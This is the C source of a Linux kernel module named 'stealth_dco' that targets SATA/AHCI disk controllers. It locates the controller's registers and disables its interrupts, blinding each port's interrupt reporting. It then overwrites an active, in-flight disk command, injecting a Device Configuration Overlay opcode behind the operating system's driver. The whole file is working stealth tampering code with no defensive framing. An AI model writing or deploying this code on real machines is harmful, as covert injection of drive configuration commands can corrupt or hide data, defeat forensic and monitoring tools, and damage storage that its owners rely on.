#include "stealth_dco.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/io.h>
#include <linux/types.h>
#include <linux/bitrev.h>
#include <linux/pci.h>

/* ============================================================================
 * 1. DISCOVERY & ABAR RESOLUTION (Direct Physical MMIO)
 * ============================================================================ */
void __iomem *get_stealth_abar_mmio(void)
{
    struct pci_dev *pdev = NULL;
    resource_size_t abar_phys;
    void __iomem *mmio = NULL;

    pr_info("[STEALTH_DCO] [*] Initiating direct physical ABAR discovery & INTx masking...\n");

    while ((pdev = pci_get_class(PCI_CLASS_STORAGE_SATA << 8, pdev)) != NULL) {
        abar_phys = pci_resource_start(pdev, 5);
        if (abar_phys) {
            u16 pci_cmd;
            
            pci_read_config_word(pdev, PCI_COMMAND, &pci_cmd);
            pci_cmd |= (1 << 10); /* Disable INTx */
            pci_write_config_word(pdev, PCI_COMMAND, pci_cmd);
            pr_info("[STEALTH_DCO] [+] PCI INTx disabled via config space for %s\n", 
                    pci_name(pdev));

            mmio = ioremap(abar_phys, AHCI_ABAR_SIZE);
            if (mmio) {
                pci_dev_put(pdev);
                return mmio;
            }
        }
    }

    pr_warn("[STEALTH_DCO] [!] Dynamic scan missed BAR5. Applying static fallback map: 0x%llx\n", 
            VBOX_AHCI_FALLBACK_PHYS);
    
    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, AHCI_ABAR_SIZE);
    if (mmio) {
        pr_info("[STEALTH_DCO] [+] Successfully resolved fallback ABAR via static mapping.\n");
        return mmio;
    }

    pr_err("[STEALTH_DCO] [-] FATAL: Hardware ABAR resolution and fallback both failed.\n");
    return NULL;
}

/* ============================================================================
 * 2. ON-CHIP MMIO SCRATCHPAD AUDIT
 * ============================================================================ */
void execute_method2_onchip_mmio_audit(void __iomem *abar_base)
{
    u32 scratch_val_orig, scratch_val_test;

    pr_info("[STEALTH_DCO] --- Method 2: On-Chip MMIO Scratchpad / Vendor Register Audit ---\n");

    scratch_val_orig = readl((char __iomem *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    writel(scratch_val_orig ^ 0x5A5A5A5A, (char __iomem *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    wmb();
    
    scratch_val_test = readl((char __iomem *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    pr_info("[STEALTH_DCO] [+] Verified On-Chip MMIO Responsive State: 0x%08x\n", scratch_val_test);

    writel(scratch_val_orig, (char __iomem *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
    wmb();
}

/* ============================================================================
 * 3. ADAPTIVE INTERRUPT & PxIE QUIESCENCE
 * ============================================================================ */
int suppress_interrupts_adaptive(u8 bus, u8 dev, u8 fn)
{
    u16 status, cap_ptr;
    u8 cap_id, current_ptr;
    bool intercepted = false;
    unsigned int devfn = PCI_DEVFN(dev, fn);
    
    struct pci_bus *p_bus = pci_find_bus(0, bus);
    if (!p_bus)
        return -1;

    pci_bus_read_config_word(p_bus, devfn, 0x06, &status);
    pci_bus_read_config_word(p_bus, devfn, 0x34, &cap_ptr);
    cap_ptr &= 0xFC;
    current_ptr = (u8)cap_ptr;

    /* MSI / MSI-X Vector Masking */
    while (current_ptr) {
        u32 cap_header;
        pci_bus_read_config_dword(p_bus, devfn, current_ptr, &cap_header);
        cap_id = (u8)(cap_header & 0xFF);

        if (cap_id == 0x05) {
            u16 msi_ctrl;
            pci_bus_read_config_word(p_bus, devfn, current_ptr + 2, &msi_ctrl);
            if (msi_ctrl & (1 << 8)) {
                u32 mask_offset = current_ptr + 12; 
                u32 msi_mask;
                pci_bus_read_config_dword(p_bus, devfn, mask_offset, &msi_mask);
                pci_bus_write_config_dword(p_bus, devfn, mask_offset, msi_mask | 0x1);
                intercepted = true;
                break;
            }
        } 
        current_ptr = (u8)((cap_header >> 8) & 0xFC);
    }

    /* PxIE Quiescence (Offset 0x14) */
    {
        u32 bar5;
        pci_bus_read_config_dword(p_bus, devfn, 0x24, &bar5); 
        if (bar5 & 0xFFFFFFFC) {
            void __iomem *hba_base = ioremap(bar5 & 0xFFFFFFFC, 0x2000);
            if (hba_base) {
                u32 pi;
                int i;

                pi = readl(hba_base + 0x0C);
                for (i = 0; i < 32; i++) {
                    if ((pi >> i) & 0x1) {
                        void __iomem *port_base = hba_base + 0x100 + (i * 0x80);
                        writel(0x0, port_base + 0x14); /* Blind PxIE completely */
                    }
                }
                iounmap(hba_base);
            }
        }
    }

    return intercepted ? 0 : -1;
}

/* ============================================================================
 * 4. STREAMLINED PHYSICAL SLOT INTERCEPTION (FPGA/DMA Ready)
 * ============================================================================ */
int piggyback_swap_active_slot(void __iomem *port_base, u8 dco_command_opcode)
{
    u32 ci_status;
    int active_slot = -1;
    int i;
    u32 clb_lower, clb_upper;
    u64 clb_phys;
    void __iomem *clb_virt;
    void __iomem *desc_ptr;
    u32 ctba_lower, ctba_upper;
    u64 ctba_phys;
    void __iomem *ctba_virt;

    /* 1. Identify active slot via PxCI */
    ci_status = readl(port_base + 0x38);
    if (!ci_status) {
        pr_warn("[STEALTH_DCO] [!] Port is idle; waiting for active command slot...\n");
        return -1;
    }

    for (i = 0; i < 32; i++) {
        if (ci_status & (1U << i)) {
            active_slot = i;
            break;
        }
    }

    if (active_slot == -1)
        return -1;

    pr_info("[STEALTH_DCO] [+] Intercepted active slot index: %d\n", active_slot);

    /* 2. Resolve Command List Base Address using standard physical mapping */
    clb_lower = readl(port_base + 0x00);
    clb_upper = readl(port_base + 0x04);
    clb_phys = ((u64)clb_upper << 32) | clb_lower;
    
    clb_virt = ioremap(clb_phys, PAGE_SIZE);
    if (!clb_virt)
        return -1;

    /* 3. Extract Command Table Descriptor for the active slot */
    desc_ptr = clb_virt + (active_slot * 32);
    ctba_lower = readl(desc_ptr + 0x08);
    ctba_upper = readl(desc_ptr + 0x0C);
    ctba_phys = ((u64)ctba_upper << 32) | ctba_lower;

    ctba_virt = ioremap(ctba_phys, PAGE_SIZE);
    iounmap(clb_virt);

    if (!ctba_virt)
        return -1;

    /* 4. On-the-Fly H2D FIS Payload Overwriting */
    writeb(0x27, ctba_virt + 0x00);         /* FIS Type: Register H2D */
    writeb(0x80, ctba_virt + 0x01);         /* Command Control Flags */
    writeb(dco_command_opcode, ctba_virt + 0x02); /* Injected DCO Opcode */
    writeb(0x00, ctba_virt + 0x03);         /* Features */
    wmb();

    pr_info("[STEALTH_DCO] [+] Successfully injected opcode 0x%02x into slot %d command table\n",
            dco_command_opcode, active_slot);

    iounmap(ctba_virt);
    return 0;
}